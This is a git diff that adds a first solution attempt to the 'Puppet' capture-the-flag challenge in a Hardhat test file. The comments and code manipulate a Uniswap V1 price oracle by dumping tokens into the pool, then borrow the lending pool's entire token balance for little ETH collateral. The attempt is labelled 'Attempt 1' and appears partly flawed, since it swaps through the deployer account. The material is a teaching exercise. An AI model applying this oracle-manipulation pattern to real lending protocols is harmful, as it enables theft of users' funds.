@@ -4,6 +4,7 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const { BigNumber } = require("ethers");
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
@@ -95,6 +96,28 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        /** Attempt 1
+         * The `PuppetPool` offers loans in DVT, if we deposit 2x the ETH.
+         * DVT <-> ETH price is calculated by the ratios of the two tokens in a Uniswap pool.
+         * depositeRequire = 2 * amount * (ETH in Uniswap) / (DVT in Uniswap)
+         * So if I can get the ETH in Uniswap = 0 => I get free loans!
+         * How do I get it to zero? Solidity rounding errors. There was this Ethernaut challenge where repeated txs essentially drain it.
+         * Or just send all my dvt and see how much eth it has.
+         */
+
+        await token.connect(deployer).approve(uniswapExchange.address, token.balanceOf(player.address));
+        await uniswapExchange.connect(deployer).tokenToEthSwapInput(
+            (await token.balanceOf(player.address)),
+            1,
+            (await ethers.provider.getBlock()).timestamp + 100010001000,
+        );
+      
+        await lendingPool.connect(player).borrow(
+            (await token.balanceOf(lendingPool.address)),
+            player.address,
+            { value: ethers.utils.parseEther("24")}
+        );
     });
 
     after(async function () {
